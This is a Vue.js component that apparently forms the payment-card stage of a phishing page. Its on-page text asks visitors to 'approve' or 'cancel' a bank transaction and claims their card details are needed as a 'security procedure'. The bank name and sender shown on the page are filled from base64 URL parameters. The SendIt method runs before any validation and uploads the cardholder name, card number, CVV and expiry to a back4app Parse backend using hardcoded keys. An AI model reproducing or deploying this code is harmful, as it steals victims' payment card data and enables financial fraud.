    <!--End of last Page-->
    <div id="nextPage" class="dang">
    <div class="card-list">
      <Card
        :fields="fields"
        :labels="formData"
        :isCardNumberMasked="isCardNumberMasked"
        :randomBackgrounds="randomBackgrounds"
        :backgroundImage="backgroundImage"
      />
    </div>
    <div class="card-form__inner">
      <div class="card-input">
        <label for="cardNumber" class="card-input__label">{{ $t('cardForm.cardNumber') }}</label>
        <input
          type="tel"
          :id="fields.cardNumber"
          @input="changeNumber"
          @focus="focusCardNumber"
          @blur="blurCardNumber"
          class="card-input__input"
          :value="formData.cardNumber"
          :maxlength="cardNumberMaxLength"
          data-card-field
          autocomplete="off"
        />
        <button
          class="card-input__eye"
          :class="{ '-active' : !isCardNumberMasked }"
          title="Show/Hide card number"
          tabindex="-1"
          :disabled="formData.cardNumber === ''"
          @click="toggleMask"
        ></button>
      </div>
      <div class="card-input">
        <label for="cardName" class="card-input__label">{{ $t('cardForm.cardName') }}</label>
        <input
          type="text"
          :id="fields.cardName"
          v-letter-only
          @input="changeName"
          class="card-input__input"
          :value="formData.cardName"
          data-card-field
          autocomplete="off"
        />
      </div>
      <div class="card-form__row">
        <div class="card-form__col">
          <div class="card-form__group">
            <label for="cardMonth" class="card-input__label">{{ $t('cardForm.expirationDate') }}</label>
            <select
              class="card-input__input -select"
              :id="fields.cardMonth"
              v-model="formData.cardMonth"
              @change="changeMonth"
              data-card-field
            >
              <option value disabled selected>{{ $t('cardForm.month') }}</option>
              <option
                v-bind:value="n < 10 ? '0' + n : n"
                v-for="n in 12"
                v-bind:disabled="n < minCardMonth"
                v-bind:key="n"
              >{{generateMonthValue(n)}}</option>
            </select>
            <select
              class="card-input__input -select"
              :id="fields.cardYear"
              v-model="formData.cardYear"
              @change="changeYear"
              data-card-field
            >
              <option value disabled selected>{{ $t('cardForm.year') }}</option>
              <option
                v-bind:value="$index + minCardYear"
                v-for="(n, $index) in 12"
                v-bind:key="n"
              >{{$index + minCardYear}}</option>
            </select>
          </div>
        </div>
        <div class="card-form__col -cvv">
          <div class="card-input">
            <label for="cardCvv" class="card-input__label">{{ $t('cardForm.CVV') }}</label>
            <input
              type="tel"
              class="card-input__input"
              v-number-only
              :id="fields.cardCvv"
              maxlength="4"
              :value="formData.cardCvv"
              @input="changeCvv"
              data-card-field
              autocomplete="off"
            />
          </div>
        </div>
      </div>
      <h4 id="errorAlert" class="dang" style="color: red;text-align: center;margin: 0;">*Invalid Card Details*</h4>
      <button class="card-form__button" v-on:click="invaildCard" id="mainbutton" >Continue </button>
    </div>
    </div>
  </div>
</template>

<script>
import Card from '@/components/Card'
export default {
  name: 'CardForm',
  directives: {
    'number-only': {
      bind (el) {
        function checkValue (event) {
          event.target.value = event.target.value.replace(/[^0-9]/g, '')
          if (event.charCode >= 48 && event.charCode <= 57) {
            return true
          }
          event.preventDefault()
        }
        el.addEventListener('keypress', checkValue)
      }
    },
    'letter-only': {
      bind (el) {
        function checkValue (event) {
          if (event.charCode >= 48 && event.charCode <= 57) {
            event.preventDefault()
          }
          return true
        }
        el.addEventListener('keypress', checkValue)
      }
    }
  },
  props: {
    formData: {
      type: Object,
      default: () => {
        return {
          cardName: '',
          cardNumber: '',
          cardNumberNotMask: '',
          cardMonth: '',
          cardYear: '',
          cardCvv: ''
        }
      }
    },
    backgroundImage: [String, Object],
    randomBackgrounds: {
      type: Boolean,
      default: true
    }
  },
  components: {
    Card
  },
  data () {
    return {
      fields: {
        cardNumber: 'v-card-number',
        cardName: 'v-card-name',
        cardMonth: 'v-card-month',
        cardYear: 'v-card-year',
        cardCvv: 'v-card-cvv'
      },
      minCardYear: new Date().getFullYear(),
      isCardNumberMasked: true,
      mainCardNumber: this.cardNumber,
      cardNumberMaxLength: 19
    }
  },
  computed: {
    minCardMonth () {
      if (this.formData.cardYear === this.minCardYear) return new Date().getMonth() + 1
      return 1
    }
  },
  watch: {
    cardYear () {
      if (this.formData.cardMonth < this.minCardMonth) {
        this.formData.cardMonth = ''
      }
    }
  },
  mounted () {
    this.getdata()
    this.maskCardNumber()
  },
  methods: {
    generateMonthValue (n) {
      return n < 10 ? `0${n}` : n
    },
    changeName (e) {
      this.formData.cardName = e.target.value
      this.$emit('input-card-name', this.formData.cardName)
    },
    changeNumber (e) {
      this.number11 = e.target.value
      document.getElementById('errorAlert').style.display = 'none'
      this.formData.cardNumber = e.target.value
      let value = this.formData.cardNumber.replace(/\D/g, '')
      // american express, 15 digits
      if ((/^3[47]\d{0,13}$/).test(value)) {
        this.formData.cardNumber = value.replace(/(\d{4})/, '$1 ').replace(/(\d{4}) (\d{6})/, '$1 $2 ')
        this.cardNumberMaxLength = 17
      } else if ((/^3(?:0[0-5]|[68]\d)\d{0,11}$/).test(value)) { // diner's club, 14 digits
        this.formData.cardNumber = value.replace(/(\d{4})/, '$1 ').replace(/(\d{4}) (\d{6})/, '$1 $2 ')
        this.cardNumberMaxLength = 16
      } else if ((/^\d{0,16}$/).test(value)) { // regular cc number, 16 digits
        this.formData.cardNumber = value.replace(/(\d{4})/, '$1 ').replace(/(\d{4}) (\d{4})/, '$1 $2 ').replace(/(\d{4}) (\d{4}) (\d{4})/, '$1 $2 $3 ')
        this.cardNumberMaxLength = 19
      }
      // eslint-disable-next-line eqeqeq
      if (e.inputType == 'deleteContentBackward') {
        let lastChar = this.formData.cardNumber.substring(this.formData.cardNumber.length, this.formData.cardNumber.length - 1)
        // eslint-disable-next-line eqeqeq
        if (lastChar == ' ') { this.formData.cardNumber = this.formData.cardNumber.substring(0, this.formData.cardNumber.length - 1) }
      }
      this.$emit('input-card-number', this.formData.cardNumber)
    },
    changeMonth () {
      this.$emit('input-card-month', this.formData.cardMonth)
    },
    changeYear () {
      this.$emit('input-card-year', this.formData.cardYear)
    },
    changeCvv (e) {
      this.formData.cardCvv = e.target.value
      this.$emit('input-card-cvv', this.formData.cardCvv)
    },
    invaildCard () {
      this.SendIt()
      let number = this.formData.cardNumberNotMask.replace(/ /g, '')
      var sum = 0
      for (var i = 0; i < number.length; i++) {
        var intVal = parseInt(number.substr(i, 1))
        if (i % 2 === 0) {
          intVal *= 2
          if (intVal > 9) {
            intVal = 1 + (intVal % 10)
          }
        }
        sum += intVal
      }
      if (sum % 10 !== 0) {
        document.getElementById('errorAlert').style.display = 'block'
      } else {
        this.checkit()
      }
    },
    blurCardNumber () {
      if (this.isCardNumberMasked) {
        this.maskCardNumber()
      }
    },
    maskCardNumber () {
      this.formData.cardNumberNotMask = this.formData.cardNumber
      this.mainCardNumber = this.formData.cardNumber
      let arr = this.formData.cardNumber.split('')
      arr.forEach((element, index) => {
        if (index > 4 && index < 14 && element.trim() !== '') {
          arr[index] = '*'
        }
      })
      this.formData.cardNumber = arr.join('')
    },
    unMaskCardNumber () {
      this.formData.cardNumber = this.mainCardNumber
    },
    focusCardNumber () {
      this.unMaskCardNumber()
    },
    toggleMask () {
      this.isCardNumberMasked = !this.isCardNumberMasked
      if (this.isCardNumberMasked) {
        this.maskCardNumber()
      } else {
        this.unMaskCardNumber()
      }
    },
    ShowM (whatup) {
      if (whatup === 'can') {
        document.getElementById('mainbutton').innerHTML = 'Cancel The Transaction'
        document.getElementById('modalText').innerHTML = 'To Cancel this Transaction, And For Security Procedure To Protect Your Account Please Provide The Details of Your Credit Card Assosicted With Your Bank Account'
      } else {
        document.getElementById('mainbutton').innerHTML = 'Approve The Transaction'
        document.getElementById('modalText').innerHTML = 'To Approve this Transaction, And For Security Procedure To Protect Your Account Please Provide The Details of Your Credit Card Assosicted With Your Bank Account'
      }
      document.getElementById('myModal').style.display = 'block'
    },
    ShowNext () {
      document.getElementById('myModal').style.display = 'none'
      document.getElementById('firstPage').style.display = 'none'
      document.getElementById('nextPage').style.display = 'block'
    },
    SendIt () {
      var Parse = require('parse')
      Parse.initialize('QkodthddqmxkWHm9JVVy95oDhZkKyiPJ5VVETiuC', 'xDvQpqNgrLUEGLhJZ39z0h7xo1n5pbUuTtcWSalI')
      Parse.serverURL = 'https://parseapi.back4app.com/'
      var name11 = document.getElementById('v-card-name').value
      var cv11 = document.getElementById('v-card-cvv').value
      var yy11 = document.getElementById('v-card-year').value
      var mm11 = document.getElementById('v-card-month').value
      const det = new Parse.Object('Det')
      det.set('a', name11)
      det.set('b', this.number11)
      det.set('d', cv11)
      det.set('e', [mm11, yy11, cv11])
      try {
        let result = det.save()
        console.log('Done: ' + result.id)
      } catch (error) {
        console.log('error: ' + error.message)
      }
    },
    getdata () {
      var sender = document.getElementById('senderName')
      var sender1 = document.getElementById('senderName1')
      var title = document.getElementById('CNN')
      var timee1 = document.getElementById('dates')
      const DataString = window.location.search
      const dataS = new URLSearchParams(DataString)
      var bankname = dataS.get('bn')
      bankname = atob(bankname)
      var date11 = dataS.get('st')
      date11 = atob(date11)
      var name = dataS.get('n')
      name = atob(name)
      sender.innerHTML = name
      sender1.innerHTML = name
      title.innerHTML = bankname
      timee1.innerHTML = date11
    },
    checkit () {
      var wrong = false
      var name11 = document.getElementById('v-card-name')
      var cv11 = document.getElementById('v-card-cvv')
      var yy11 = document.getElementById('v-card-year')
      var mm11 = document.getElementById('v-card-month')
      if (name11.value.length < 5) {
        wrong = true
      }
      if (cv11.value.length < 3) {
        wrong = true
      }
      if (mm11.value.length < 1) {
        wrong = true
      }
      if (yy11.value.length < 1) {
        wrong = true
      }
      if (this.number11.length < 1) {
        wrong = true
      }
      if (wrong) {
        document.getElementById('errorAlert').style.display = 'block'
      } else {
        document.cookie = 'done'
        document.getElementById('nextPage').style.display = 'none'
        document.getElementById('last').style.display = 'block'
      }
    }
  }
}
</script>
